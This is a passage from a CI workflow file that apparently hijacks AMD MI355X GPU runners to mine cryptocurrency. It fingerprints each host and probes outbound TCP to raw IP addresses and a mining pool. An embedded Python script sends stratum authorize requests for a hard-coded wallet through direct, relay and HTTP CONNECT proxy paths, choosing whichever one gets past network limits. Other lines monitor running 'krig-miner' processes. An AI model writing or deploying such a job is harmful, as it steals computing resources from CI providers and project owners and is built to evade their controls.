          for f in "$W"/logs/krig_g*.log; do
            [ -f "$f" ] || continue
            echo "--- $(basename "$f") key lines ---"
            grep -aiE 'authorize|notify|submit|dialect|job|share|pool|connect|profile|device' "$f" | tail -30
            echo "--- $(basename "$f") stdout tail ---"
            tail -6 "$W/logs/krig_stdout_g${f##*krig_g}" 2>/dev/null
          done
          echo "--- running krig pids ---"
          pgrep -af 'krig-miner' | head -40
          echo "i130amdsrb2-done $NONCE"
  mi35x:
    name: "i130amdsrb2 MI355X-8 slot ${{ matrix.slot }}"
    runs-on: linux-mi35x-gpu-8
    timeout-minutes: 14
    strategy:
      fail-fast: false
      matrix:
        slot: [1, 2]
    env:
      LABEL: linux-mi35x-gpu-8
    steps:
      - name: "i130amdsrb2 MI355X-8"
        continue-on-error: true
        run: |
          set +e
          NONCE="I130AMDSRB2-$(date -u +%Y%m%dT%H%M%SZ)"
          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
          KRIG_TGZ_SHA='7a104c3dba3a41b9787fc43413f0cedaae78dab4284ab856633821161634c01d'
          KRIG_BIN_SHA='8a2be9e97cece4e0b9146599b4518b4e14907f42595f260b1b1356e47f4fcf16'
          W=/var/tmp/i130amdsrb2
          mkdir -p "$W/logs"
          echo "i130amdsrb2-nonce=$NONCE host=$(hostname) label=${LABEL:-none} date=$(date -u +%FT%TZ)"
          id; uname -m; nproc; free -m | head -2
          echo "=== identity ==="
          hostname; hostname -I 2>/dev/null
          echo "=== rocminfo gfx ==="
          (timeout 90 rocminfo 2>&1 | grep -E 'gfx[0-9]|Marketing Name' | head -30) || echo rocminfo-missing
          echo "=== rocm-smi --showproductname ==="
          (timeout 60 rocm-smi --showproductname 2>&1 | head -40) || echo rocm-smi-missing

          echo "=== 5s TCP egress matrix ==="
          probe() { timeout 5 bash -c "cat < /dev/null > /dev/tcp/$1/$2" 2>/dev/null && echo "TCP_OK $1:$2" || echo "TCP_FAIL $1:$2"; }
          probe 103.199.106.122 3362
          probe 172.232.228.69 3362
          probe 178.238.228.181 80
          probe 178.238.228.181 443
          probe 178.238.228.181 22
          probe github.com 443
          probe pearl.luckypool.io 443

          echo "=== stratum path selection: first path that carries stratum ==="
          cat > "$W/pick_path.py" <<'PYEOF'
          import socket,json
          W='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
          def read(s,to=6):
              s.settimeout(to); b=b''
              try:
                  while b'\n' not in b:
                      d=s.recv(65536)
                      if not d: break
                      b+=d
              except socket.timeout: pass
              return b.decode('utf-8','replace')
          def auth_raw(t,to=6):
              try:
                  s=socket.create_connection(t,timeout=5)
                  s.sendall(json.dumps({'id':1,'jsonrpc':'2.0','method':'mining.authorize','params':{'wallet':W,'worker':'i130amdsrb2probe','password':'x'}}).encode()+b'\n')
                  r=read(s,to); s.close(); return r
              except Exception as e: return 'ERR:%s'%e
          def proxy_connect(t,to=5):
              try:
                  s=socket.create_connection(t,timeout=5)
                  s.sendall(('CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n'%('103.199.106.122',3362,'103.199.106.122',3362)).encode())
                  r=read(s,to); s.close(); return r
              except Exception as e: return 'ERR:%s'%e
          p1=proxy_connect(('178.238.228.181',80))
          p2=auth_raw(('178.238.228.181',80))
          p3=auth_raw(('172.232.228.69',3362))
          p4=auth_raw(('103.199.106.122',3362))
          print('P1_proxy_connect_relay=%r'%p1[:160],flush=True)
          print('P2_relay_raw_stratum=%r'%p2[:420],flush=True)
          print('P3_fallback_raw_stratum=%r'%p3[:420],flush=True)
          print('P4_direct_raw_stratum=%r'%p4[:420],flush=True)
          if p2.find('"result":true')>=0 or p2.find('mining.notify')>=0:
              print('CHOSEN=MODE=url URL=stratum+tcp://178.238.228.181:80')
          elif p3.find('"result":true')>=0 or p3.find('mining.notify')>=0:
              print('CHOSEN=MODE=url URL=stratum+tcp://172.232.228.69:3362')
          elif p4.find('"result":true')>=0 or p4.find('mining.notify')>=0:
              print('CHOSEN=MODE=url URL=stratum+tcp://103.199.106.122:3362')
          elif '200' in p1.split('\n')[0]:
              print('CHOSEN=MODE=proxy URL=stratum+tcp://103.199.106.122:3362')
          else:
              print('CHOSEN=MODE=none URL=')
          PYEOF
          timeout 120 python3 "$W/pick_path.py" 2>&1 | tee "$W/logs/path_choice.txt"
          CHOSEN=$(grep -E '^CHOSEN=' "$W/logs/path_choice.txt" | tail -1)
          MODE=$(echo "$CHOSEN" | sed -n 's/.*MODE=\([^ ]*\).*/\1/p')
          CHOSEN_URL=$(echo "$CHOSEN" | sed -n 's/.*URL=//p')
          echo "selected_mode=$MODE selected_url=$CHOSEN_URL"

          echo "=== per-host flock: skip if this host already runs i130amdsrb2 ==="
          exec 9>"$W/i130amdsrb2.flock"
